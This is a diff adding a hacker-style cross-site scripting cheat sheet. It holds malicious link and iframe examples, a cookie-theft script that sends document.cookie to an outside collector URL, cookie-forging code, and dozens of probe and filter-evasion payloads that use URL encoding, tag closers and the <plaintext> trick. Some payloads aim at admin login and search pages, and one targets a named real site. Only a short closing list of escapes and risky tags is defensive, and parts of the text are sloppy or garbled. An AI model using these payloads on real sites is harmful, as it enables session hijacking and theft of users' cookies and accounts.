@@ -1,0 +1,247 @@
+Cross Site Scripting exsistance is because of the lack of filtering engines to user inputs at websites on forms.
+
+Hackers Evil Link
+
+[example 1] <a href="[http://<XSS-host]/xssfile?evil request">Free Laptop!</a> 
+[example 2] <iframe src="[http://<XSS-host]/xssfile?evil request">Free Laptop!</iframe> 
+[example 3] <SCRIPT>document.write("<SCRI");</SCRIPT>PT src="http://www.Site.com/xss.js"></SCRIPT>
+
+
+
+
+XSS Cookie theft Javascript
+
+http://host/a.php?variable="><script>document.location='http://www.mysite.com/cgi-bin/cookie.cgi? 
+'%20+document.cookie</script>
+
+
+
+
+Moding Cookies
+
+[example 1] <script>javascript:void(document.cookie="username=Admin")</script>
+
+
+
+
+
+How to Search for Vul Hosts
+
+[example 1] [host]/<script>alert("XSS")</script> 
+[example 2] [host]/<script>alert('XSS')</script>/ 
+[example 3] [host]/<script>alert('XSS')</script>. 
+[example 4] [host]/<script>alert('XSS')</script> 
+[example 5] [host]/\<script\>alert(\'XSS\')\<\/script\> 
+[example 6] [host]/perl/\<sCRIPT>alert("d")</sCRIPT>\.pl 
+[example 7] [host]/\<sCRIPT>alert("d")</sCRIPT>\ 
+[example 8] [host]/<\73CRIP\T>alert("dsf")<\/\73CRIP\T> 
+[example 9] [host]/<\73CRIP\T>alert('dsf')<\/\73CRIP\T> 
+[example 10] [host]/</sCRIP/T>alert("dsf")<///sCRIP/T> 
+[example 11] [host]/</sCRIP/T>alert('dsf')<///sCRIP/T>
+
+
+
+
+[example 1] <script>javascript:alert(documentt.cookie)</script> 
+[example 2] <script>javascript:alert("XSS")</script> 
+[example 3] "<script>alert()</script>"This Site is not Secure!
+
+
+
+
+
+- Also use "?" post request after the host.
+
+[example 1] [host]/?<script>alert('XSS')</script>
+
+
+
+
+WebServers XSS
+
+
+Many webservers have default pages to folders that will look for a file.
+
+[example 1] [host]/[folder]/"<script%20language=vbscript>msgbox%20sadas</script>".bas 
+[example 2] [host]/[folder]/"<script%20language=vbscript>msgbox%20sadas</script>".asp 
+[example 3] [host]/[folder]/"<script%20language=vbscript>msgbox%20sadas</script>".jsp 
+[example 4] [host]/[folder]/"<script%20language=vbscript>msgbox%20sadas</script>".htm 
+[example 5] [host]/[folder]/"<script%20language=vbscript>msgbox%20sadas</script>".html 
+[example 6] [host]/[folder]/"<script%20language=vbscript>msgbox%20sadas</script>".[ext]
+
+
+
+
+A common place for an XSS hole is inside a server default example files, such as:
+
+[example 1] [host]/cgi/example?test=<script>alert('xss')</script>
+
+
+
+
+Most common places to find XSS in are the search files of servers.
+
+[example 1] [host]/search.php?searchstring=<script>alert('XSS')</script> 
+[example 2] [host]/search.php?searchstring="><script>alert('XSS')</script> 
+[example 3] [host]/search.php?searchstring='><script>alert('XSS')</script>
+
+
+
+
+Social Engineering XSS
+
+Using the characters instead may fool the filters and allow XSS to work.
+
+[example 1] [host]/%3cscript%3ealert('XSS')%3c/script%3e 
+[example 2] [host]/%3c%53cript%3ealert('XSS')%3c/%53cript%3e 
+[example 3] [host]/%3c%53cript%3ealert('XSS')%3c%2f%53cript%3e 
+[example 4] [host]/%3cscript%3ealert('XSS')%3c/script%3e 
+[example 5] [host]/%3cscript%3ealert('XSS')%3c%2fscript%3e 
+[example 6] [host]/%3cscript%3ealert(%27XSS%27)%3c%2fscript%3e 
+[example 7] [host]/%3cscript%3ealert(%27XSS%27)%3c/script%3e 
+[example 8] [host]/%3cscript%3ealert("XSS")%3c/script%3e 
+[example 9] [host]/%3c%53cript%3ealert("XSS")%3c/%53cript%3e 
+[example 10] [host]/%3c%53cript%3ealert("XSS")%3c%2f%53cript%3e 
+[example 11] [host]/%3cscript%3ealert("XSS")%3c/script%3e 
+[example 12] [host]/%3cscript%3ealert("XSS")%3c%2fscript%3e 
+[example 13] [host]/%3cscript%3ealert(%34XSS%34)%3c%2fscript%3e 
+[example 14] [host]/%3cscript%3ealert(%34XSS%34)%3c/script%3e
+
+
+
+
+
+- Also use "?" post request after the host.
+
+[example 1] [host]/?%3cscript%3ealert('XSS')%3c/script%3e
+
+
+
+
+100% encoded
+
+[example 1] [host]/?%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d 
+%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e 
+[example 2] [host]/?%27%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e 
+%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e 
+[example 3] [host]/%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%63% 
+6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e
+
+
+
+
+Another form of encoding is: <script>alert(document.cookie)</script>
+
+< is encoded as: <
+> is encoded as: >
+
+
+[example 1] %3Cscript%3Ealert(%22XSS%22)%3C/script%3E 
+[example 2] <script>alert("XSS")</script> 
+[example 3] <script>alert("XSS")</script> 
+[example 4] <script>alert(%34XSS%34)</script> 
+[example 5] <script>alert('XSS')</script>
+
+
+
+
+[example 1] www.pbs.org/search/search_results.html?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+
+
+
+Any of the XSS requests presented above could be used on any asp, cfm,
+jsp, cgi, php or any other active html file.
+
+[example 1] [host]/forum/post.asp?<script>alert('XSS')</script> 
+[example 2] [host]/forum/post.asp?%3cscript%3ealert('XSS')%3c/script%3e 
+[example 3] [host]/forum/post.asp?%3cscript%3ealert(%27XSS%27)%3c/script%3e 
+[example 4] [host]/forum/post.asp?%3cscript%3ealert(%34XSS%34)%3c/script%3e 
+[example 5] [host]/forum/post.asp?<script>alert("XSS")</script>
+
+
+
+
+Finding errors such as inputting a string instead of a number or "\" or "/" instead of a string,
+or a very long string & a very large number. All this malformed parameters can help us find
+the place to inject XSS script.
+
+Tag Closer
+
+The "Tag Closer" method is used by inputing non-alphabetic and non-numeric chars
+inside form's input text boxes. This chars could be: \,/,~,!,#,$,%,^,&,-,[,],null(char 255),.(dot)
+But the chars that mostly does the job is either " or '. What we do is just insert "> or '> inside
+a text box instead of our name/email/username/password and etc...
+
+[example 1] [host]/admin/login.asp?username="><script>alert('XSS')</script>&password=1234 
+[example 2] [host]/admin/login.asp?username=admin&password="><script>alert('XSS')</script> 
+[example 3] [host]/admin.php?action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&mainnews=~~~~"> 
+< /textarea>--><script>alert('XSS')</script> 
+[example 4] [host]/search.php?action=soundex&firstname="><script>alert(document.cookie)</script>
+
+
+
+
+[example 1] [host]/admin/login.asp?username='><script>alert('XSS')</script>&password=1234 
+[example 2] [host]/admin/login.asp?username=admin&password='><script>alert('XSS')</script> 
+[example 3] [host]/admin.php?action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&mainnews=~~~~'></textarea>--> 
+< script>alert('XSS')</script> 
+[example 4] [host]/search.php?action=soundex&firstname='><script>alert(document.cookie)</script>
+
+
+
+
+This mainly works on the servers root:
+
+[example 1] [host]/?"><script>alert('XSS')</script> 
+[example 2] [host]/?'><script>alert('XSS')</script> 
+[example 3] [host]/?--><script>alert('XSS')</script>
+
+
+
+
+About <plaintext>
+
+Another trick for exploiting an XSS was found by putting a <plaintext> tag
+after the xss code. Sometimes that makes it easie to exploit.
+
+[example 1] [host]/?"><script>alert('XSS')</script><plaintext> 
+[example 2] [host]/?'><script>alert('XSS')</script><plaintext> 
+[example 3] [host]/admin/login.asp?username="><script>alert('XSS')</script><plaintext>&password=1234 
+[example 4] [host]/admin/login.asp?username=admin&password="><script>alert('XSS')</script><plaintext> 
+[example 5] [host]/forum/post.asp?<script>alert('XSS')</script><plaintext> 
+[example 6] [host]/forum/post.asp?%3cscript%3ealert('XSS')%3c/script%3e<plaintext> 
+[example 7] [host]/forum/post.asp?%3cscript%3ealert(%27XSS%27)%3c/script%3e<plaintext> 
+[example 8] [host]/forum/post.asp?%3cscript%3ealert(%34XSS%34)%3c/script%3e<plaintext> 
+[example 9] [host]/forum/post.asp?<script>alert("XSS")</script><plaintext> 
+[example 10] [host]/search.php?action=soundex&firstname="><script>alert(document.cookie)</script>&lt;plaintext>
+
+
+
+
+[example 1] www.pbs.org/search/search_results.html?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cplaintext%3E[/code{ ] 
+ } 
+
+Simple Codes just incase some of them do-not seem to work:
+
+[code]< /title><script>alert("XSS");</script><title><plaintext> 
+< script>alert(document.cookie)</script><plaintext>
+
+
+
+
+Security Conclusion
+
+[Replace]
+
+< with <
+> with >
+& with &
+" with &quote;
+
+[Possible XSS]
+
+<applet> <frameset> <layer> <body>
+< html> <ilayer> <embed> <iframe>
+< meta> <frame> <img> <object>
+< script> <style>
